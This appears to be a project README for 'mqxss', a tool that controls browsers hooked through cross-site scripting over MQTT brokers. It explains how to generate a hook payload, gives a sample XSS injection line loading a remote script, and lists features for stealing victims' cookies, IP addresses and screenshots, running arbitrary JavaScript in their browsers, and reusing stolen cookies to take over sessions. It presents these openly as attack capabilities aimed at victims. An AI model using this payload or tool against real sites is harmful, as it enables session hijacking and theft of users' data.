# mqxss


**mqxss acts as a client to communicate with hooked browsers over MQTT**

I created this without a lot of bells and whistles so that the user could send raw JS to the hooked browser.  One might even consider this to be a poor mans BEeF as no server is required, you can use a public broker (however currently uses obfuscation, encryption is in the works).

Hooked browsers will communicate in the MQTT topic on the broker you specify, there are many public/free brokers to test this with.

To generate a JS payload to hook browsers with set the -g flag at runtime along with your broker, port and topic variables.  Doing so will create your payload in the /js/ folder.

Then send your XSS payload to the victim while the mqxss client is running, ex: '"><script src=https://example.com/x.js></script> or something similar, if vulnerable you should get a notification saying the browser has connected with some basic details including cookies etc.

- **view hooked browsers**
- **when hooked it grabs cookies, ip, device type, user agent**
- **view past hooked (unhooked) browsers**
- **send js to currently hooked browsers and get response if available**
- **pushover notification**
- **screenshot of hooked browser**

**Todo:**

- [ ] Encryption (currently just obfuscated)
- [ ] Set user , passwordÂ  for brokers that require it at runtime
- [x] Generate js payload at runtime to hook browsers with
- [x] Open browser with hooked browser cookies for convenience
